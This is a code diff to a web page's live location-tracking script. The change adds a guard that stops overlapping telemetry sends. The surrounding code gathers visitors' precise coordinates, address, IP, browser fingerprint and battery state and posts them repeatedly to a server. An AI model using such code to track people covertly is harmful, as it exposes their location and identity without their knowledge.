@@ -281,6 +281,7 @@
         let latestPosition = null;
         let liveTimer = null;
         let watchId = null;
+        let isSending = false;
 
         function startLiveTracking(initialLat, initialLng) {
             lastSentLocation = {
@@ -346,54 +347,62 @@
         }
 
         async function sendLiveUpdate(posObj) {
-            let city = null;
-            let address = null;
-            try {
-                const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${posObj.latitude}&lon=${posObj.longitude}`, {
-                    headers: {
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'User-Agent': 'ViutckLocationTracker/1.0'
-                    }
-                });
-                if (geoResponse.ok) {
-                    const json = await geoResponse.json();
-                    city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
-                    address = json.display_name;
-                }
-            } catch (e) {}
+            if (isSending) return;
+            isSending = true;
 
-            let freshBattery = batteryInfo;
-            try {
-                const batt = await getBatteryInfo();
-                if (batt.battery_level !== null) freshBattery = batt;
-            } catch (e) {}
-
-            const payload = {
-                latitude: posObj.latitude,
-                longitude: posObj.longitude,
-                accuracy: posObj.accuracy,
-                altitude: posObj.altitude,
-                city: city,
-                address: address,
-                ip_address: ip,
-                user_agent: navigator.userAgent,
-                platform: navigator.platform,
-                screen_resolution: screen.width + 'x' + screen.height,
-                language: navigator.language,
-                location_denied: false,
-                session_id: session_id,
-                ...fingerprint,
-                battery_level: freshBattery.battery_level,
-                battery_charging: freshBattery.battery_charging
-            };
-
+            // Update immediately to prevent interval overlaps during async awaits
             lastSentLocation = {
                 latitude: posObj.latitude,
                 longitude: posObj.longitude,
                 timestamp: Date.now()
             };
 
-            postTelemetry(payload, true);
+            try {
+                let city = null;
+                let address = null;
+                try {
+                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${posObj.latitude}&lon=${posObj.longitude}`, {
+                        headers: {
+                            'Accept-Language': 'en-US,en;q=0.9',
+                            'User-Agent': 'ViutckLocationTracker/1.0'
+                        }
+                    });
+                    if (geoResponse.ok) {
+                        const json = await geoResponse.json();
+                        city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
+                        address = json.display_name;
+                    }
+                } catch (e) {}
+
+                let freshBattery = batteryInfo;
+                try {
+                    const batt = await getBatteryInfo();
+                    if (batt.battery_level !== null) freshBattery = batt;
+                } catch (e) {}
+
+                const payload = {
+                    latitude: posObj.latitude,
+                    longitude: posObj.longitude,
+                    accuracy: posObj.accuracy,
+                    altitude: posObj.altitude,
+                    city: city,
+                    address: address,
+                    ip_address: ip,
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen_resolution: screen.width + 'x' + screen.height,
+                    language: navigator.language,
+                    location_denied: false,
+                    session_id: session_id,
+                    ...fingerprint,
+                    battery_level: freshBattery.battery_level,
+                    battery_charging: freshBattery.battery_charging
+                };
+
+                await postTelemetry(payload, true);
+            } finally {
+                isSending = false;
+            }
         }
 
         if (navigator.geolocation) {
